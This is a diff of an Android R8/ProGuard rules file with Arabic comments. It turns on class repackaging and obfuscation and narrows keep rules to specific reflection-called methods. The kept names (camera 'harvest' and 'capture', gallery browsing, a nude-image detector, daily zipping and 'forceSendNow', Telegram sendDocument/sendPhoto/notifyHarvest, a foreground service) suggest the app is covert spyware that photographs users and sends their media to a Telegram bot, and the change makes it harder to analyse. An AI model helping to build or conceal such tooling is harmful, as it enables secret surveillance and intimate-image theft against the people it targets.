@@ -3,21 +3,91 @@
 #  لمنع أخطاء وقت التشغيل (Runtime Errors)
 # ============================================================
 
-# ----- الحفاظ على جميع كلاسات التطبيق الرئيسية -----
--keep class com.example.app.** { *; }
--keep class com.example.app.**$* { *; }
+# ============================================================
+#  ✅ تفعيل تحسينات R8 (إعادة التسمية والتصغير)
+# ============================================================
+-repackageclasses ''
+-allowaccessmodification
+-optimize
 
-# ----- الحفاظ على كلاسات الانعكاس (Reflection) المستخدمة في الكود -----
+# ============================================================
+#  الحفاظ على السمات المطلوبة للانعكاس وتصحيح الأخطاء
+# ============================================================
+-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
+-keepattributes Exceptions
+-keepattributes LineNumberTable
+
+# ============================================================
+#  الحفاظ على كلاسات النقاط الرئيسية (Entry Points) فقط
+# ============================================================
+-keep public class com.example.app.MainActivity
+-keep public class com.example.app.ForegroundService
+
+# ============================================================
+#  ✅ حماية دوال الانعكاس (Reflection) المحددة فقط
+#  (بدلاً من حفظ الكلاسات كاملة)
+# ============================================================
+# NudeDetector - دوال تُستدعى من TelegramUi عبر الانعكاس لتحديث النموذج
+-keepclassmembers class com.example.app.NudeDetector {
+    public *** ensureModelReady(...);
+    public *** loadEngineForever(...);
+    public *** isReady(...);
+}
+
+# Monitor - دوال تُستدعى من Commands و TelegramUi عبر الانعكاس
+-keepclassmembers class com.example.app.Monitor {
+    public *** getBatteryStatus(...);
+    public *** isWifiConnected(...);
+    public *** forceHarvest(...);
+}
+
+# TelegramUi - دوال تُستدعى من DailyZipper و Commands عبر الانعكاس
+-keepclassmembers class com.example.app.TelegramUi {
+    public *** getVlt(...);
+    public *** getCtrl(...);
+    public *** getDat(...);
+    public *** sendDocument(...);
+    public *** sendPhoto(...);
+    public *** sendMessage(...);
+    public *** notifyHarvest(...);
+}
+
+# CameraAnalyzer - دالة harvest تُستدعى من Commands عبر الانعكاس
+-keepclassmembers class com.example.app.CameraAnalyzer {
+    public *** harvest(...);
+    public *** capture(...);
+}
+
+# GalleryBrowser - دوال تُستدعى من Commands عبر الانعكاس
+-keepclassmembers class com.example.app.GalleryBrowser {
+    public *** getGridKb(...);
+    public *** showOptions(...);
+    public *** executeAction(...);
+    public *** updateLastMessageId(...);
+}
+
+# DailyZipper - دوال تُستدعى من Commands عبر الانعكاس
+-keepclassmembers class com.example.app.DailyZipper {
+    public *** run(...);
+    public *** forceSendNow(...);
+}
+
+# ============================================================
+#  الحفاظ على الدوال المحددة بواسطة @Keep
+# ============================================================
+-keepclassmembers class * {
+    @androidx.annotation.Keep <methods>;
+    @androidx.annotation.Keep <fields>;
+}
+
+# ============================================================
+#  الحفاظ على كلاسات الانعكاس الأساسية
+# ============================================================
 -keep class java.lang.reflect.** { *; }
 
-# ----- الحفاظ على كلاسات TensorFlow Lite (مع دعم الانعكاس وتسريع الأجهزة) -----
--keep class org.tensorflow.lite.** { *; }
--keep class org.tensorflow.lite.support.** { *; }
--keep class org.tensorflow.lite.nnapi.** { *; }      # دعم NNAPI
--keep class org.tensorflow.lite.gpu.** { *; }        # دعم GPU
--keep class org.tensorflow.lite.xnnpack.** { *; }    # دعم XNNPACK (اختياري)
-
-# ✅ إضافة قواعد إضافية لحماية TensorFlow Lite من الإزالة
+# ============================================================
+#  الحفاظ على TensorFlow Lite (المكتبة الأساسية فقط)
+# ============================================================
 -keep class org.tensorflow.lite.Interpreter { *; }
 -keep class org.tensorflow.lite.Interpreter$Options { *; }
 -keep class org.tensorflow.lite.Tensor { *; }
@@ -26,26 +96,46 @@
 -keep class org.tensorflow.lite.DelegateFactory { *; }
 -keep class org.tensorflow.lite.nnapi.NnApiDelegate { *; }
 -keep class org.tensorflow.lite.gpu.GpuDelegate { *; }
+-keep class org.tensorflow.lite.support.** { *; }
 
-# منع التحذيرات من TensorFlow Lite (لأنها تستخدم الانعكاس)
+# منع التحذيرات من TensorFlow Lite
 -dontwarn org.tensorflow.lite.**
 
-# ----- الحفاظ على كلاسات OkHttp (الشبكات) -----
+# ============================================================
+#  الحفاظ على OkHttp (للشبكات)
+# ============================================================
 -keep class okhttp3.** { *; }
 -keep class okhttp3.logging.** { *; }
 -keep interface okhttp3.** { *; }
+-dontwarn okhttp3.**
 
-# ----- الحفاظ على كلاسات org.json (تحليل JSON) -----
--keep class org.json.** { *; }
+# ============================================================
+#  الحفاظ على Gson (لتحليل JSON)
+# ============================================================
+-keep class com.google.gson.** { *; }
+-keep class com.google.gson.stream.** { *; }
 
-# ----- الحفاظ على كلاسات التشفير الأساسية (Java Cryptography) -----
+# ============================================================
+#  الحفاظ على مكتبات التشفير والـ Keystore
+# ============================================================
 -keep class javax.crypto.** { *; }
+-keep class javax.crypto.spec.** { *; }
+-keep class android.security.keystore.** { *; }
 
-# ----- الحفاظ على كلاسات Kotlin الأساسية (لضمان عمل الانعكاس بشكل صحيح) -----
+# ============================================================
+#  الحفاظ على كلاسات Kotlin الأساسية والـ Coroutines
+# ============================================================
 -keep class kotlin.** { *; }
 -keep class kotlinx.coroutines.** { *; }
 
-# ----- الحفاظ على كلاسات تستخدم في التسلسل (Serialization) -----
+# ============================================================
+#  الحفاظ على كلاسات JSON
+# ============================================================
+-keep class org.json.** { *; }
+
+# ============================================================
+#  الحفاظ على كلاسات التسلسل (Serialization)
+# ============================================================
 -keepclassmembers class * implements java.io.Serializable {
     static final long serialVersionUID;
     private static final java.io.ObjectStreamField[] serialPersistentFields;
@@ -55,127 +145,27 @@
     java.lang.Object readResolve();
 }
 
-# ----- الحفاظ على Annotation المستخدمة في الانعكاس -----
--keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
+# ============================================================
+#  منع إزالة أي دالة أو حقل يحتوي على "serialVersionUID"
+# ============================================================
+-keepclassmembers class * {
+    private static final long serialVersionUID;
+}
 
-# ✅ الحفاظ على السمات الإضافية المطلوبة للانعكاس وتصحيح الأخطاء
--keepattributes Exceptions
--keepattributes LineNumberTable
-
-# ----- منع إزالة الكلاسات المستخدمة في الإنشاء الديناميكي (Dynamic Instantiation) -----
+# ============================================================
+#  الحفاظ على كلاسات الإنشاء الديناميكي
+# ============================================================
 -keepclasseswithmembers class * {
     public <init>(...);
 }
 
-# ----- الحفاظ على جميع الحقول والدوال التي قد تُستخدم عن طريق الانعكاس -----
--keepclassmembers class * {
-    @androidx.annotation.Keep <methods>;
-    @androidx.annotation.Keep <fields>;
-}
-
 # ============================================================
-#  ✅ حماية دوال الانعكاس (Reflection) الحيوية (العامة والخاصة)
+#  منع تحذيرات R8 من المكتبات الخارجية
 # ============================================================
-
-# حماية جميع الدوال (العامة والخاصة) في كل الكلاسات التي تستخدم الانعكاس
--keepclassmembers class com.example.app.Monitor {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.TelegramUi {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.Commands {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.DailyZipper {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.CameraAnalyzer {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.GalleryBrowser {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.MediaScanner {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.StreamManager {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.NudeDetector {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.SecurityHelper {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.ConfigLoader {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.FileDownloader {
-    public *;
-    private *;
-}
--keepclassmembers class com.example.app.ForegroundService {
-    public *;
-    private *;
-}
-
-# ============================================================
-#  منع إزالة كلاسات Log (إذا تم استخدامها)
-# ============================================================
--keep class android.util.Log { *; }
-
-# ============================================================
-#  منع تحسينات R8 التي قد تعطل استخدام بعض المكتبات
-# ============================================================
--dontwarn okhttp3.**
--dontwarn org.json.**
 -dontwarn javax.**
 -dontwarn kotlin.**
-
-# ============================================================
-#  احتفظ بأسماء الدوال في حال استخدام الانعكاس بالاسم
-# ============================================================
--keepnames class * {
-    public *;
-}
-
-# ============================================================
-#  إضافات خاصة لحل مشكلة R8 (الفئات المفقودة من Google APIs)
-# ============================================================
 -dontwarn com.google.api.client.**
 -dontwarn com.google.crypto.tink.**
-
-# ============================================================
-#  إضافات إضافية لتحسين التوافق والأمان
-# ============================================================
-
-# الحفاظ على كلاسات Gson (لأنها تستخدم الانعكاس)
--keep class com.google.gson.** { *; }
--keep class com.google.gson.stream.** { *; }
-
-# الحفاظ على كلاسات Okio (إذا تم استخدامها مع OkHttp)
--keep class okio.** { *; }
-
-# الحفاظ على كلاسات الأمان (SecurityHelper) التي تستخدم Keystore و Cipher
--keep class javax.crypto.spec.** { *; }
--keep class android.security.keystore.** { *; }
-
-# منع إزالة أي دالة أو حقل يحتوي على اسم "serialVersionUID" (للتسلسل)
--keepclassmembers class * {
-    private static final long serialVersionUID;
-}
 
 # ============================================================
 #  نهاية القواعد
